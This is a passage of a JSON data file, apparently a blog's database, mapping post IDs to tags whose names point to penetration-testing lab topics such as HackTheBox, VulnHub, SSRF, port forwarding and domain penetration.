cl5up2nyc0006wku11mv9eo4r","tag_id":"cl5up2nya0004wku13jjaekdu","_id":"cl5up2nye000awku13lc44ldf"},{"post_id":"cl5up2ny60001wku112am8y1q","tag_id":"cl5up2nya0004wku13jjaekdu","_id":"cl5up2nyf000cwku1biau0gnj"},{"post_id":"cl5up2nyc0007wku12udq09b2","tag_id":"cl5up2nya0004wku13jjaekdu","_id":"cl5up2nyg000hwku1e8wt6nrv"},{"post_id":"cl5up2ny80002wku1eeofejxn","tag_id":"cl5up2nya0004wku13jjaekdu","_id":"cl5up2nyh000kwku15a9aelca"},{"post_id":"cl5up2nyb0005wku14ue7g7va","tag_id":"cl5up2nya0004wku13jjaekdu","_id":"cl5up2nyj000pwku19bufe7d7"},{"post_id":"cl5up2nye000bwku1d89q6i8t","tag_id":"cl5up2nyi000owku11tfs4mtb","_id":"cl5up2nyl000xwku1azvgb5an"},{"post_id":"cl5up2nyf000dwku1345jgzgg","tag_id":"cl5up2nyk000vwku1bsjc5kp8","_id":"cl5up2nyl0011wku1bvkeervp"},{"post_id":"cl5up2nyg000iwku175kibbuw","tag_id":"cl5up2nyl000zwku1gbem1r8c","_id":"cl5up2nym0015wku1dv26d501"},{"post_id":"cl5up2nyi000lwku12n2vca1m","tag_id":"cl5up2nyl0013wku188vkf8ei","_id":"cl5up2nym0018wku17qqz4pvt"},{"post_id":"cl5up2nyj000qwku1asi1hsv4","tag_id":"cl5up2nyl0013wku188vkf8ei","_id":"cl5up2nym001awku1dtasgis2"},{"post_id":"cl5up2nyj000swku176xqgice","tag_id":"cl5up2nyl0013wku188vkf8ei","_id":"cl5up2nyn001bwku16fnzctxx"},{"post_id":"cl5up2nyr001cwku10ybg17cz","tag_id":"cl5up2nyl0013wku188vkf8ei","_id":"cl5up2nys001ewku18ciyedgf"},{"post_id":"cl5up2nyr001dwku10rtgeymm","tag_id":"cl5up2nys001fwku1cyscewr1","_id":"cl5up2nys001iwku19ah4e1fz"}],"Tag":[{"name":"HackTheBox","_id":"cl5up2nya0004wku13jjaekdu"},{"name":"VulnHhub","_id":"cl5up2nyi000owku11tfs4mtb"},{"name":"SSRF","_id":"cl5up2nyk000vwku1bsjc5kp8"},{"name":"端口转发","_id":"cl5up2nyl000zwku1gbem1r8c"},{"name":"VulnHub","_id":"cl5up2nyl0013wku188vkf8ei"},{"name":"域渗透","_id":"cl5up2nys001fwku1cyscewr1"}]}}